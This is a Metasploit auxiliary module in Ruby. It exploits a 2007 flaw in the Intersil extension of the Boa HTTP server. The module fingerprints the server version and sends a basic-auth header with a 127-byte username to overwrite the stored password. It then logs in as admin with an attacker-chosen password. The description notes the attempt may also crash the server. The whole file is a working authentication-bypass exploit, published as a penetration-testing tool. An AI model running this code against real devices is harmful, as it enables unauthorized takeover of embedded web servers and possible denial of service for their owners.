##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Intersil (Boa) HTTPd Basic Authentication Password Reset',
      'Description'   => %q{
          The Intersil extention in the Boa HTTP Server 0.93.x - 0.94.11
          allows basic authentication bypass when the user string is greater
          than 127 bytes long.  The long string causes the password to be
          overwritten in memory, which enables the attacker to reset the
          password.  In addition, the malicious attempt also may cause a
          denial-of-service condition.

          Please note that you must set the request URI to the directory that
          requires basic authentication in order to work properly.
        },
      'Author'        =>
        [
          'Luca "ikki" Carettoni <luca.carettoni[at]securenetwork.it>', #original discoverer
          'Claudio "paper" Merloni <claudio.merloni[at]securenetwork.it>', #original discoverer
          'Max Dietz <maxwell.r.dietz[at]gmail.com>' #metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'BID', '25676'],
          [ 'URL', 'http://packetstormsecurity.org/files/59347/boa-bypass.txt.html']
        ],
      'DisclosureDate' => 'Sep 10 2007'))

    register_options(
      [
        OptString.new('TARGETURI', [ true,  "The request URI", '/']),
        OptString.new('PASSWORD', [true, 'The password to set', 'pass'])
      ], self.class)
  end

  def check
    begin
      res = send_request_cgi({
        'uri'=>'/',
        'method'=>'GET'
      })

      if (res and (m = res.headers['Server'].match(/Boa\/(.*)/)))
        print_status("#{@peer} - Boa Version Detected: #{m[1]}")
        return Exploit::CheckCode::Safe if (m[1][0].ord-48>0) # boa server wrong version
        return Exploit::CheckCode::Safe if (m[1][3].ord-48>4)
        return Exploit::CheckCode::Vulnerable
      else
        print_status("#{@peer} - Not a Boa Server!")
        return Exploit::CheckCode::Safe # not a boa server
      end

    rescue Rex::ConnectionRefused
      print_error("#{@peer} - Connection refused by server.")
      return Exploit::CheckCode::Safe
    end
  end

  def run
    @peer = "#{rhost}:#{rport}"
    return if check != Exploit::CheckCode::Vulnerable

    uri = normalize_uri(target_uri.path)
    uri << '/' if uri[-1,1] != '/'

    res = send_request_cgi({
      'uri'=> uri,
      'method'=>'GET',
      'authorization' => basic_auth(Rex::Text.rand_text_alpha(127),datastore['PASSWORD'])
    })

    if res.nil?
      print_error("#{@peer} - The server may be down")
      return
    elsif res and res.code != 401
      print_status("#{@peer} - #{uri} does not have basic authentication enabled")
      return
    end

    print_status("#{@peer} - Server still operational. Checking to see if password has been overwritten")
    res = send_request_cgi({
      'uri'   => uri,
      'method'=> 'GET',
      'authorization' => basic_auth('admin', datastore['PASSWORD'])
    })

    if not res
      print_error("#{@peer} - Server timedout, will not continue")
      return
    end

    case res.code
    when 200
      print_good("#{@peer} - Password reset successful with admin:#{datastore['PASSWORD']}")
    when 401
      print_error("#{@peer} - Access forbidden. The password reset attempt did not work")
    else
      print_status("#{@peer} - Unexpected response: Code #{res.code} encountered")
    end

  end
end
